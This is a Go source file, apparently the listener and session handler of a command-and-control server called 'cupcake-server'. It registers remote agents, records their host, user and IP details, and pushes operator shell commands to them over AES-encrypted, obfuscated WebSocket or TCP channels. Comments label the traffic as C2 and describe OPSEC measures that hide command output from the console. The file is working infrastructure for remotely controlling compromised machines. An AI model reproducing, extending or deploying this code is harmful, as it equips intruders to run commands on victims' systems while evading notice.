package services

import (
	"encoding/json"
	"encoding/binary"
	"encoding/hex"
	"io"
	"net"
	"log"
	"github.com/gorilla/websocket"
	"github.com/hashicorp/yamux"
	"github.com/google/uuid"
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/store"
	"cupcake-server/pkg/model"
	"cupcake-server/pkg/utils"
	"fmt"
	"strings"
	"time"
)

func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Listener) {
	var clientUUID string
	var client *globals.Client
	done := make(chan struct{})

	defer func() {
		close(done)
		if clientUUID != "" {
			globals.Clients.Delete(clientUUID)
			globals.PTYState.Delete(clientUUID)
			store.UpdateAgentStatus(clientUUID, "offline")
			log.Printf("Agent Off: %s", clientUUID)
			
			// Notify Offline
			if client != nil {
				NotifyAgentOffline(client.UUID, client.Hostname)
			}

			if client != nil {
				if client.OutputChannel != nil {
					close(client.OutputChannel)
				}
			}
		}
		if conn != nil {
			conn.Close()
		}
	}()

	// Start Write Loop only after registration
	startWriteLoop := func(c *globals.Client) {
		go func() {
			for {
				select {
				case <-done:
					return
				case cmdStr, ok := <-c.CommandChannel:
					if !ok {
						return
					}
					
					// Transformation: Wrap raw string from Admin Terminal into strict JSON Command
					msg := globals.MessageWrapper{
						MsgType: "command",
						Payload: globals.CommandPayload{
							CommandType:    "shell",
							CommandContent: cmdStr,
							ReqID:          uuid.New().String(),
						},
					}
					
					if err := WriteEncryptedMessage(c, msg); err != nil {
						log.Printf("Failed to send command to %s: %v", c.UUID, err)
						return
					}
				}
			}
		}()
	}

	// --- Read Loop ---
	for {
		messageType, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		// OpSec Logic: In Base64 mode, we use TextMessage, otherwise Binary
		_ = messageType // Avoid "unused" but informative for debugging

		keyBytes := resolveAESKey(ln.EncryptKey)
		saltBytes := []byte(ln.EncryptionSalt)
		
		// Derive the real session key if salt is present
		sessionKey := utils.DeriveKey(keyBytes, saltBytes)
		
		useAES := isAESEnabled(ln.EncryptMode) || (strings.TrimSpace(ln.EncryptMode) == "" && len(keyBytes) > 0)

		var plaintext []byte
		if useAES {
			if len(keyBytes) == 0 {
				log.Printf("Encrypted listener missing AES key for %s", remoteAddr)
				break
			}
			
			// 1. Deobfuscate
			deobfuscated := utils.DeobfuscatePacket(message, ln.ObfuscateMode, sessionKey)
			
			// 2. Decrypt
			decrypted, err := utils.DecryptAES(deobfuscated, sessionKey)
			if err != nil {
				log.Printf("Decryption failed for %s: %v", remoteAddr, err)
				break
			}
			plaintext = decrypted
		} else if len(keyBytes) > 0 {
			// Auto-detect compatibility
			deobfuscated := utils.DeobfuscatePacket(message, ln.ObfuscateMode, sessionKey)
			if decrypted, err := utils.DecryptAES(deobfuscated, sessionKey); err == nil {
				plaintext = decrypted
			} else {
				plaintext = message
			}
		} else {
			plaintext = message
		}

		// Protocol Adapter: Unmarshal top-level MessageWrapper
		var msg globals.MessageWrapper
		if err := json.Unmarshal(plaintext, &msg); err != nil {
			log.Printf("Failed to unmarshal message: %v", err)
			continue
		}

		switch msg.MsgType {
		case "register":
			pData, _ := json.Marshal(msg.Payload)
			var p map[string]interface{}
			json.Unmarshal(pData, &p)
			
			id, _ := p["uuid"].(string)
			hostname, _ := p["hostname"].(string)
			os, _ := p["os"].(string)
			username, _ := p["username"].(string)
			arch, _ := p["arch"].(string)

			// ⚡️ CRITICAL FIX: Upsert Agent to Database immediately
			agentDBModel := &model.Agent{
				UUID:      id,
				Hostname:  hostname,
				IP:        remoteAddr,
				OS:        os,
				Username:  username,
				Arch:      arch,
				Status:    "online",
				LastSeen:  time.Now(),
				EncryptionSalt:  ln.EncryptionSalt,
				ObfuscationMode: ln.ObfuscateMode,
			}

			if err := store.SaveAgent(agentDBModel); err != nil {
				log.Printf("[DB] Failed to persist agent %s: %v", id, err)
			} else {
				log.Printf("[DB] Agent %s registered/updated successfully", id)
			}

			client = &globals.Client{
				WebSocketConn:  conn,
				Transport:      "websocket",
				UUID:           id,
				Hostname:       hostname,
				OS:             os,
				Arch:           arch,
				Username:       username,
				IP:             remoteAddr,
				EncryptMode:    ln.EncryptMode,
				EncryptKey:     ln.EncryptKey,
				EncryptionSalt: ln.EncryptionSalt,
				ObfuscateMode:  ln.ObfuscateMode,
				CommandChannel: make(chan string, 10),
				OutputChannel:  make(chan string, 10),
				ListenerID:     ln.ID,
				ListenerPort:   ln.Port,
			}
			clientUUID = id

			globals.Clients.Store(id, client)
			log.Printf("Agent On: [%s] via %s (Enc: %s)", id, remoteAddr, ln.EncryptMode)

			// Notify Online
			NotifyAgentOnline(client.UUID, client.Hostname, client.IP, client.OS, client.Username)

			// Start the write loop now that the client is registered
			startWriteLoop(client)

		case "response":
			// Protocol Adapter: Parse Payload as ResponsePayload
			pData, _ := json.Marshal(msg.Payload)
			
			// 1. Unmarshal into map first to maintain flexibility for Sync-Async Bridge (e.g. file data)
			var pMap map[string]interface{}
			json.Unmarshal(pData, &pMap)

			// 2. Unmarshal into strict ResponsePayload for Shell output logic
			var resp globals.ResponsePayload
			if err := json.Unmarshal(pData, &resp); err != nil {
				log.Printf("Failed to parse response payload: %v", err)
				continue
			}

			// Broadcast: Format output and send to Client.OutputChannel (Real-time Terminal)
			if client != nil && client.OutputChannel != nil {
				// Persistence: Update Output Log
				if resp.ReqID != "" {
					go func() {
						store.UpdateCommandOutput(resp.ReqID, resp.Stdout, resp.Stderr)
					}()
				}

				output := resp.Stdout
				// 🛡️ NOISE FILTER: If output looks like JSON, don't send to terminal (likely raw data for internal modules)
				isJSON := len(output) > 2 && (output[0] == '[' || output[0] == '{')

				doneToken := "__CUPCAKE_DONE__"
				ptyDone := false
				if strings.Contains(output, doneToken) {
					ptyDone = true
					output = strings.ReplaceAll(output, doneToken, "")
				}
				if strings.Contains(resp.Stderr, doneToken) {
					ptyDone = true
					resp.Stderr = strings.ReplaceAll(resp.Stderr, doneToken, "")
				}
				if strings.TrimSpace(output) == "" {
					output = ""
				}
				
				if output == "" && resp.Stderr != "" {
					output = fmt.Sprintf("[ERR] %s", resp.Stderr)
				} else if resp.Stderr != "" && !isJSON {
					output = fmt.Sprintf("%s\n[ERR] %s", output, resp.Stderr)
				}
				
				if output != "" {
					if strings.Contains(output, "Interactive shell session ended") {
						globals.PTYState.Delete(clientUUID)
					}
					// ⚡️ Enhancement: Internal JSON wrap for TaskID support in real-time console
					internalMsg := struct {
						TaskID  string `json:"task_id"`
						Type    string `json:"type"`
						Content string `json:"content"`
					}{
						TaskID:  resp.ReqID,
						Type:    "TERM",
						Content: output,
					}
					if isJSON {
						internalMsg.Type = "JSON_DATA"
					}
					
					jsonOut, _ := json.Marshal(internalMsg)
					select {
					case client.OutputChannel <- string(jsonOut):
					default:
					}
				}
				if ptyDone {
					doneMsg := struct {
						TaskID  string `json:"task_id"`
						Type    string `json:"type"`
						Content string `json:"content"`
					}{
						TaskID:  resp.ReqID,
						Type:    "PTY_DONE",
						Content: "",
					}
					jsonOut, _ := json.Marshal(doneMsg)
					select {
					case client.OutputChannel <- string(jsonOut):
					default:
					}
				}
			}

			// Sync-Async Bridge (Relay original payload map back to API callers)
			if reqID, ok := pMap["req_id"].(string); ok && reqID != "" {
				if ch, found := globals.PendingResponses.Load(reqID); found {
					select {
					case ch.(chan interface{}) <- pMap:
					default:
					}
				}
			}

			// Legacy Logging
			logs, _ := globals.LogsMap.LoadOrStore(clientUUID, []string{})
			logsArr := logs.([]string)
			if resp.Stdout != "" {
				logsArr = append(logsArr, resp.Stdout)
			}
			if resp.Stderr != "" {
				logsArr = append(logsArr, "[ERR] "+resp.Stderr)
			}
			globals.LogsMap.Store(clientUUID, logsArr)

			// ⚡ OPSEC: 不要在黑窗口显示具体回显内容，内容已保存到数据库
			// log.Printf("[C2 Output] Agent %s returned:\n%s\n%s", clientUUID, resp.Stdout, resp.Stderr)
			log.Printf("[C2 IO] Response received from Agent %s (ReqID: %s)", clientUUID, resp.ReqID)
		}
	}
}

// ProcessTCPConnection handles raw TCP or Yamux multiplexed control streams
func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener, session interface{}) {
	var clientUUID string
	var client *globals.Client
	done := make(chan struct{})

	defer func() {
		close(done)
		if clientUUID != "" {
			globals.Clients.Delete(clientUUID)
			store.UpdateAgentStatus(clientUUID, "offline")
			log.Printf("Agent (Mapped TCP) Off: %s", clientUUID)
			if client != nil {
				NotifyAgentOffline(client.UUID, client.Hostname)
			}
			if client != nil && client.OutputChannel != nil {
				close(client.OutputChannel)
			}
		}
		conn.Close()
		// If it's a multiplexed session, closing the stream doesn't close the session,
		// but we might want to shut down the session if the control channel dies.
		if session != nil {
			// type assertion or use interface
			if s, ok := session.(io.Closer); ok {
				s.Close()
			}
		}
	}()
// ... rest of logic remains same but uses 'conn' (which is the stream)

	startWriteLoop := func(c *globals.Client) {
		go func() {
			for {
				select {
				case <-done:
					return
				case cmdStr, ok := <-c.CommandChannel:
					if !ok { return }
					msg := globals.MessageWrapper{
						MsgType: "command",
						Payload: globals.CommandPayload{
							CommandType:    "shell",
							CommandContent: cmdStr,
							ReqID:          uuid.New().String(),
						},
					}
					if err := WriteEncryptedMessage(c, msg); err != nil {
						return
					}
				}
			}
		}()
	}

	for {
		// 1. Read Header (4 bytes length)
		header := make([]byte, 4)
		if _, err := io.ReadFull(conn, header); err != nil {
			break
		}
		length := binary.BigEndian.Uint32(header)
		if length == 0 {
			continue
		}
		if length > 100*1024*1024 {
			log.Printf("[TCP] Frame too large (%d bytes), closing connection", length)
			break
		}

		// 2. Read Body
		body := make([]byte, length)
		if _, err := io.ReadFull(conn, body); err != nil {
			break
		}

		keyBytes := resolveAESKey(ln.EncryptKey)
		saltBytes := []byte(ln.EncryptionSalt)
		sessionKey := utils.DeriveKey(keyBytes, saltBytes)
		
		useAES := isAESEnabled(ln.EncryptMode) || (strings.TrimSpace(ln.EncryptMode) == "" && len(keyBytes) > 0)
		
		plaintext := body
		if useAES {
			if len(keyBytes) == 0 {
				log.Printf("[TCP] Encrypted listener missing AES key")
				break
			}
			
			// 1. Deobfuscate
			deobfuscated := utils.DeobfuscatePacket(body, ln.ObfuscateMode, sessionKey)
			
			// 2. Decrypt
			decrypted, err := utils.DecryptAES(deobfuscated, sessionKey)
			if err != nil {
				log.Printf("[TCP] Decryption failed: %v", err)
				break
			}
			plaintext = decrypted
		} else if len(keyBytes) > 0 {
			// Auto-detect compatibility
			deobfuscated := utils.DeobfuscatePacket(body, ln.ObfuscateMode, sessionKey)
			if decrypted, err := utils.DecryptAES(deobfuscated, sessionKey); err == nil {
				plaintext = decrypted
			}
		}

		var msg globals.MessageWrapper
		if err := json.Unmarshal(plaintext, &msg); err != nil {
			continue
		}

		switch msg.MsgType {
		case "register":
			pData, _ := json.Marshal(msg.Payload)
			var p map[string]interface{}
			json.Unmarshal(pData, &p)
			id, _ := p["uuid"].(string)
			hostname, _ := p["hostname"].(string)
			os, _ := p["os"].(string)
			username, _ := p["username"].(string)
			arch, _ := p["arch"].(string)

			// ⚡️ CRITICAL FIX: Upsert Agent to Database immediately
			agentDBModel := &model.Agent{
				UUID:      id,
				Hostname:  hostname,
				IP:        remoteAddr,
				OS:        os,
				Username:  username,
				Arch:      arch,
				Status:    "online",
				LastSeen:  time.Now(),
				EncryptionSalt:  ln.EncryptionSalt,
				ObfuscationMode: ln.ObfuscateMode,
			}
			
			if err := store.SaveAgent(agentDBModel); err != nil {
				log.Printf("[DB] Failed to persist TCP agent %s: %v", id, err)
			} else {
				log.Printf("[DB] TCP Agent %s registered/updated successfully", id)
			}

			var ySession *yamux.Session
			if s, ok := session.(*yamux.Session); ok {
				ySession = s
			}

			client = &globals.Client{
				TCPConn:        conn,
				YamuxSession:   ySession,
				Transport:      "tcp",
				UUID:           id,
				Hostname:       hostname,
				OS:             os,
				Arch:           arch,
				Username:       username,
				IP:             remoteAddr,
				EncryptMode:    ln.EncryptMode,
				EncryptKey:     ln.EncryptKey,
				EncryptionSalt: ln.EncryptionSalt,
				ObfuscateMode:  ln.ObfuscateMode,
				CommandChannel: make(chan string, 10),
				OutputChannel:  make(chan string, 10),
				ListenerID:     ln.ID,
				ListenerPort:   ln.Port,
			}
			clientUUID = id

			globals.Clients.Store(id, client)
			log.Printf("Agent (TCP) On: [%s] via %s", id, remoteAddr)
			NotifyAgentOnline(client.UUID, client.Hostname, client.IP, client.OS, client.Username)
			startWriteLoop(client)

		case "response":
			pData, _ := json.Marshal(msg.Payload)
			var pMap map[string]interface{}
			json.Unmarshal(pData, &pMap)

			var resp globals.ResponsePayload
			json.Unmarshal(pData, &resp)

			if client != nil && client.OutputChannel != nil {
				if resp.ReqID != "" {
					go store.UpdateCommandOutput(resp.ReqID, resp.Stdout, resp.Stderr)
					// ⚡ OPSEC: 移除 TCP 回显内容的控制台打印
					// log.Printf("[C2 Output] Agent %s returned:\n%s\n%s", clientUUID, resp.Stdout, resp.Stderr)
					log.Printf("[C2 IO] TCP Response received from Agent %s (ReqID: %s)", clientUUID, resp.ReqID)
				}
				output := resp.Stdout
				if output == "" && resp.Stderr != "" {
					output = "[ERR] " + resp.Stderr
				}
				if output != "" {
					select {
					case client.OutputChannel <- output:
					default:
					}
				}
			}

			if reqID, ok := pMap["req_id"].(string); ok && reqID != "" {
				if ch, found := globals.PendingResponses.Load(reqID); found {
					select {
					case ch.(chan interface{}) <- pMap:
					default:
					}
				}
			}
		}
	}
}

// WriteEncryptedMessage is a helper to encrypt and send JSON messages to any transport
func WriteEncryptedMessage(client *globals.Client, msg interface{}) error {
	// Persist Command Log
	if wrapper, ok := msg.(globals.MessageWrapper); ok {
		if wrapper.MsgType == "command" {
			// Try to inspect payload
			if payload, ok := wrapper.Payload.(globals.CommandPayload); ok {
				// Ensure ReqID exists for tracking/logging
				if payload.ReqID == "" {
					payload.ReqID = uuid.New().String()
					wrapper.Payload = payload
					msg = wrapper
				}
				// Record command
				input := payload.CommandContent
				if payload.CommandType == "file_upload" {
					input = fmt.Sprintf("Upload %s", payload.Path)
				} else if payload.CommandType == "file_download" {
					input = fmt.Sprintf("Download %s", payload.Path)
				}
				
				// Run in background to not block sending
				go func() {
					store.CreateCommandLog(client.UUID, payload.ReqID, payload.CommandType, input)
				}()
			}
		}
	}

	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	keyBytes := resolveAESKey(client.EncryptKey)
	saltBytes := []byte(client.EncryptionSalt)
	sessionKey := utils.DeriveKey(keyBytes, saltBytes)
	
	useAES := isAESEnabled(client.EncryptMode) || (strings.TrimSpace(client.EncryptMode) == "" && len(keyBytes) > 0)

	var payload []byte
	if useAES {
		if len(keyBytes) == 0 {
			return fmt.Errorf("encrypt mode enabled but AES key is empty")
		}
		
		// 1. Encrypt
		encrypted, err := utils.EncryptAES(data, sessionKey)
		if err != nil {
			return err
		}
		
		// 2. Obfuscate
		payload = utils.ObfuscatePacket(encrypted, client.ObfuscateMode, sessionKey)
	} else {
		payload = data
	}

	if client.Transport == "websocket" {
		msgType := websocket.BinaryMessage
		if strings.ToLower(client.ObfuscateMode) == "base64" {
			msgType = websocket.TextMessage
		}
		return client.WebSocketConn.WriteMessage(msgType, payload)
	} else if client.Transport == "tcp" {
		// Use framing for TCP
		header := make([]byte, 4)
		binary.BigEndian.PutUint32(header, uint32(len(payload)))
		if _, err := client.TCPConn.Write(header); err != nil {
			return err
		}
		if _, err := client.TCPConn.Write(payload); err != nil {
			return err
		}
		return nil
	}

	return fmt.Errorf("unknown transport: %s", client.Transport)
}

func isAESEnabled(mode string) bool {
	switch strings.ToUpper(strings.TrimSpace(mode)) {
	case "AES-256-GCM", "AES-GCM", "AES":
		return true
	default:
		return false
	}
}

func resolveAESKey(key string) []byte {
	key = strings.TrimSpace(key)
	if key == "" {
		key = store.GetSetting("system_aes_key")
	}
	return normalizeAESKey(key)
}

func normalizeAESKey(key string) []byte {
	key = strings.TrimSpace(key)
	key = strings.Trim(key, "\x00")
	if len(key) == 64 && isHexString(key) {
		if decoded, err := hex.DecodeString(key); err == nil && len(decoded) == 32 {
			return decoded
		}
	}
	return []byte(key)
}
